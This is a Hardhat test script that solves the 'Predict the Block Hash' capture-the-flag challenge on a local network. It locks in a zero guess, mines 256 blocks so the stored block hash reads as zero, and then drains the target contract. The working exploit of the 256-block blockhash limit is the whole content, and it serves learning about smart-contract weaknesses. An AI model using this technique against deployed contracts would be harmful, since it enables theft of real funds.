import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import helpers from "@nomicfoundation/hardhat-network-helpers";
import { Contract } from 'ethers';
import { ethers,network } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let target: Contract;
  let hack: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });
    await target.deployed();

    hack = await (
      await ethers.getContractFactory('PredictTheBlockHashChallengeAttack', deployer)
    ).deploy(target.address);
    await hack.deployed();

    hack = hack.connect(attacker);
  });

  it('exploit', async () => {
        const lockInGuessTx = await target.lockInGuess(
      "0x0000000000000000000000000000000000000000000000000000000000000000",
      { value: utils.parseEther("1") },
    );
    await lockInGuessTx.wait();

    const initBlockNumber = await provider.getBlockNumber();

    let lastBlockNumber = initBlockNumber;
    do {
      lastBlockNumber = await provider.getBlockNumber();
      console.log(`Block number: ${lastBlockNumber}`);

      await ethers.provider.send("evm_mine", []);
    } while (lastBlockNumber - initBlockNumber < 256);

    const attackTx = await target.settle();
    await attackTx.wait();
    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
